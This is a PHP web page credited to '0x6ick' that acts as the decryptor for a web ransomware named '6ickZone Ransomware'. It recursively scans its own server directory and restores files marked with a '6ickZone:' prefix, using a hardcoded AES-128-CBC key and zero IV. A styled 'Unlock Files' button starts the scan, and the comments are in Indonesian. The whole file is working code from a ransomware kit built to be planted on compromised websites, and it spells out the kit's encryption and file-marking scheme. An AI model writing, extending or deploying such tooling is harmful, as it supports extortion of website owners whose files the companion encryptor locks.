<?php
/**
            * decryptor by 0x6ick ( Copyright 2025 by 6ickwhispers@gmail.com) 
          **/
set_time_limit(0);
error_reporting(0);

$key = "6ickZoneRansomKey"; // harus sama kayak yang waktu encrypt
$iv = str_repeat("\0", 16);

function decryptFile($file, $key, $iv) {
    $data = file_get_contents($file);
    if ($data === false) return false;

    if (substr($data, 0, 9) !== "6ickZone:") {
        return false; // bukan file terenkripsi, skip
    }

    $encrypted = base64_decode(substr($data, 9));
    $decrypted = openssl_decrypt($encrypted, 'AES-128-CBC', $key, 0, $iv);
    if ($decrypted === false) return false;

    return file_put_contents($file, $decrypted);
}

function scanAndDecrypt($dir, $key, $iv, &$count) {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;

        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            scanAndDecrypt($path, $key, $iv, $count);
        } elseif (is_file($path)) {
            if (decryptFile($path, $key, $iv)) {
                $count++;
            }
        }
    }
}

if (isset($_POST['unlock'])) {
    $rootDir = __DIR__;
    $count = 0;
    scanAndDecrypt($rootDir, $key, $iv, $count);
    $unlocked = true;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>6ickZone Ransomware - Decrypt</title>
    <style>
        body { background:#121212; color:#eee; font-family: Arial, sans-serif; text-align:center; padding: 50px; }
        h1 { color:#4caf50; }
        button { background:#4caf50; border:none; padding:15px 30px; color:#fff; font-size:16px; cursor:pointer; border-radius:5px; }
        button:hover { background:#388e3c; }
        .info { margin-top: 20px; font-size: 18px; }
        .footer { margin-top: 50px; font-size: 14px; color:#777; }
    </style>
</head>
<body>
    <h1>6ickZone Ransomware - Decrypt</h1>
    <p>Scan folder ini dan subfolder untuk unlock semua file terenkripsi.</p>

    <?php if (empty($unlocked)): ?>
        <form method="post">
            <button type="submit" name="unlock">Unlock Files</button>
        </form>
    <?php else: ?>
        <div class="info">
            <p>Selesai! Total file terbuka kembali: <strong><?= $count ?></strong></p>
        </div>
    <?php endif; ?>

    <div class="footer">by 0x6ick - 6ickZone</div>
</body>
</html>
